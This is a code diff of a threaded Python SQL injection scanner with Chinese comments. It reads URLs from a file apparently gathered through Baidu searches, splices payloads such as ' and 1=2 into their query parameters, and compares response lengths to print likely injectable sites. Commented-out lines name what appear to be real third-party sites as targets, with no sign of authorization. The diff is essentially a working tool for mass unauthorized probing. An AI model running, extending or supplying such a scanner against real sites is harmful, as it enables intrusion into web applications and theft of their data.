@@ -1,6 +1,6 @@
-#Python3
+#!C:\Python3\python.exe
 # -*- coding:u8 -*-
-#写得粗糙
+#
 from threading import Thread
 #import urllib2
 from os import path as ospath
@@ -27,7 +27,8 @@ class SQLiThread(Thread):
 				#print str_url
 		except Exception as e:
 			print (e)
-			print ('30')
+		
+
 from bs4 import BeautifulSoup as bs
 def SQLiTester(url):
 	'''
@@ -40,26 +41,34 @@ def SQLiTester(url):
 
     状态码404的应该丢弃
 	'''
-	tags = ['\'','\"','and 1=2']#....etc
+	#tags = ['%27']
+	tags = ['\'', '\' and 1=2', '\"', '\" and 1=2', 'e0and 1=2']#....etc
+	#and sleep(1)
 	lists = SQLiTestLists(url,tags)
 	result_list_s = []
 	for list in lists:
 		result_list = []
 		for url_test in list: 
-			#print url_test
+			#print (url_test)
 			try:
-				request = urllib.request.Request(url)
+				request = urllib.request.Request(url_test)
+				
+				#proxies={'http://':'192.0.0.1:8080'}
+				#proxy_support = urllib.request.ProxyHandler(proxies)
 				opener = urllib.request.build_opener()
 				response = opener.open(request)
 				html = response.read()
-				soup = bs(html,'html.parser')
-				body = soup.find(name='body')
-				#print (stripOut(body.text))
-				result_list.append(stripOut(body.text))
+				
+				#soup = bs(html,'html.parser')
+				#body = soup.find(name='body')
+				#print ('len:%d'%len(html))
+				#print (type(html))
+				result_list.append(html)
 			except Exception as e:
 				#print (e)
-				print ('60')
-				return result_list
+				#print ('60')
+				#return result_list
+				continue
 		result_list_s.append(result_list)
 	return result_list_s
 
@@ -74,32 +83,45 @@ def create_threads(threads_num,queue_read,url,extension,queue_write,loop_queue):
 	for t in threads:
 		t.start()
 '''
+
 def getURL(queue_url):
-    fo = open('%s/com/sqli_url.txt'%parent_dir,'r')
-    for item in fo:
-        #print item.strip()
-        queue_url.put(item.strip())
-    fo.close()
+	'''
+	读取sqli
+	'''
+	fo = open('%s/com/sqli_baidu_url.txt'%parent_dir,'r')
+	for item in fo:
+		#print item.strip()
+		queue_url.put(item.strip())
+	fo.close()
 
 def getSQLiPosition(url,position=0):
-    position = url.find('=',position)
-    return position
+	position = url.find('&',position)
+	return position
 	
 def SQLiTestLists(url,tags):
-    position = 0
-    tag_test_list_s = []
-    in_for = False
-    while getSQLiPosition(url,position+1)>0:
-        tag_test_list = []
-        for tag in tags:
-            if  not in_for:
-                position = getSQLiPosition(url,position+1)
-                in_for = True
-            url_test = url[0:position+1] + tag + url[position+1:]
-            tag_test_list.append(url_test)
-        in_for = False
-        tag_test_list_s.append(tag_test_list)
-    return tag_test_list_s
+	'''
+	将payload放入url
+	'''
+	position = 0
+	tag_test_list_s = []
+	in_for = False
+	first = True
+	while getSQLiPosition(url,position+1)>0 or first is True:
+		
+		tag_test_list = []
+		for tag in tags:
+			if  not in_for:
+				position = getSQLiPosition(url,position+1)
+				in_for = True
+			if position < 0:
+				first = False
+				position = len(url)
+			url_test = url[0:position] + tag + url[position:]
+			tag_test_list.append(url_test)
+		in_for = False
+		tag_test_list_s.append(tag_test_list)
+	return tag_test_list_s
+
 
 def normalCheckURL(url):
 	'''
@@ -110,10 +132,17 @@ def normalCheckURL(url):
 		opener = urllib.request.build_opener()
 		response = opener.open(request)
 		html = response.read()
-		soup = bs(html,'html.parser')
-		body = soup.find(name='body')
-		return body.text
-	except (NoneType,AttributeError) as e:
+		#soup = bs(html,'html.parser')
+		#body = soup.find(name='body')
+		#print (html)
+		return html
+	except urllib.error.HTTPError as e:
+		#print (e)
+		return None
+	except urllib.error.URLError as e:
+		#print (e)
+		return None
+	except Exception as e:
 		#print (e)
 		#print('118')
 		return None
@@ -121,7 +150,7 @@ def normalCheckURL(url):
 def stripOut(string):
 	'''
 	去掉 \\n \\t \\r space
-	'''
+	
 	try:
 		string.replace('\n','').replace('\t','').replace('r','').replace(' ','')
 	except (NoneType,AttributeError) as e:
@@ -130,7 +159,9 @@ def stripOut(string):
 		print (string)
 	finally:
 		return string
-		
+	'''
+	#return string.replace('\n','').replace('\t','').replace('r','').replace(' ','')
+	return string
 
 def distinguishString(normal,result_list_s):
 	'''
@@ -140,7 +171,8 @@ def distinguishString(normal,result_list_s):
 	
 	'''
 	len_normal = len(normal)
-	seq_list = 0
+	#print (len_normal)
+	#seq_list = 0
 	for result_list in result_list_s:
 		size = len(result_list)
 		if size <0:
@@ -151,26 +183,33 @@ def distinguishString(normal,result_list_s):
 		len_list.append(len_normal)
 		for test in result_list:
 			len_test = len(test)
+			
 			if len_test == len_normal:
 				len_same_count+=1
 			len_list.append(len_test)
 		if len_same_count == size:
+			#print (len_same_count)
+			#print (size)
 			continue
-		#return seq_list#暂时就这样，先找出字段
+		
 		return distinguishStringDeeper(len_list)
-		seq_list+=1
+		
 		#测试页面长度都与normal length，retun 0
 	return -1
 def distinguishStringDeeper(len_list):
 	len_normal=len_list[0]
 	rate_low = 0.95
 	rate_high = 1.04
-	for i in range(0,len(len_list)-1):
-		rate = len_list[i+1]/len_list[0]
+	rate_ = 0.7
+	for i in range(1,len(len_list)):
+		rate = float(len_list[i])/float(len_list[0])
 		if rate_low < rate and rate < rate_high:
+			#print ('----- rate :%f-----'%rate)
 			continue
-		print ('----- rate -----')
-		return i
+		elif rate_ < rate:
+			print ('----- rate :%f-----'%rate)
+			return i
+	return -1
 	
 		
 	
@@ -195,11 +234,11 @@ if __name__ == '__main__':
 	#url ='http://www.spgykj.com/newsshow.php?id=12274'
 	#url = 'http://skype-tom.com/goods.php?id=42'
 
-	import hashlib
+
 	
 	while not queue_url.empty():
 		url = queue_url.get_nowait()
-		print (url)
+		#print (url)
 		normal = normalCheckURL(url)
 		normal = stripOut(normal)
 		if normal is None:
@@ -208,7 +247,9 @@ if __name__ == '__main__':
 		#print (hash(str))
 		result_list_s = SQLiTester(url)
 		
-		print (distinguishString(normal,result_list_s))
+		result = distinguishString(normal,result_list_s)
+		if  result is not None and result >=0:
+			print ('[+]Possible : %s'%url)
 	
 	
 	'''
